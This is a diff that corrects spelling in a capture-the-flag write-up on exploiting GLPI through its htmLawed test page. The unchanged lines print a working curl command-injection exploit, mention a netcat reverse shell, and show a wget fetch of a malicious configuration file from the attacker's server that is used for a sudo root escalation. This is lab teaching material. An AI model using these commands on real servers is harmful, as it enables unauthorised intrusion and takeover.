@@ -30,12 +30,12 @@ From there we move on with our recon and attempt to find the version of GLPI run
 The version of GLPI can be seen in the photo below.
 ![glpi version enum](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/glpi-version.png "a title")
 
-Now that we know the version running, we can google it to find avaiable exploits and shortly after, we find one on github from [Orange-CyberDefense](https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/POC_2022-35914.sh)
+Now that we know the version running, we can google it to find available exploits and shortly after, we find one on github from [Orange-CyberDefense](https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/POC_2022-35914.sh)
 
 **CURL Command to exploit the vulnerability** <br>
 ```curl -s -d 'sid=foo&hhook=exec&text=[command]' -b 'sid=foo' http://[target-ip]/vendor/htmlawed/htmlawed/htmLawedTest.php |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'```
 
-Replace [command] and [target] with the command you  want to execute on the target and the IP address of the target respecfully.
+Replace [command] and [target] with the command you  want to execute on the target and the IP address of the target respectfully.
 
 We modify the exploit to get a reverse shell on our netcat listener.<br>
 Firstly, we must make sure we are listening for incoming connections. <br>
@@ -76,12 +76,12 @@ Now we have to transfer our malicious configuration to the target. To make that 
 `python3 -m http.server 8000` <br>
 ![python http server](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/start-python-http-server.png "a title")
 
-Downloading the malicious configuation from our python http server.<br>
-NB: make sure you have write privileges to the current diretory you are in. You can use the `/tmp` since it has very loose permissions.<br>
+Downloading the malicious configuration from our python http server.<br>
+NB: make sure you have write privileges to the current directory you are in. You can use the `/tmp` since it has very loose permissions.<br>
 `wget http://<server.ip>:<port>/test.conf`
 ![python http server](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/downloading-mal-conf-file.png "a title")
 
-Right after downloading the file we transfer it the the `/var/tmp` direcrory. This is necessary because it is the only folder that we can execute configuration files from.<br>
+Right after downloading the file we transfer it the the `/var/tmp` directory. This is necessary because it is the only folder that we can execute configuration files from.<br>
 ![copy to var-tmp](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/copy-payload-to-tmp.png "a title")
 
 Now we can run our command with sudo to gain root privileges.<br>
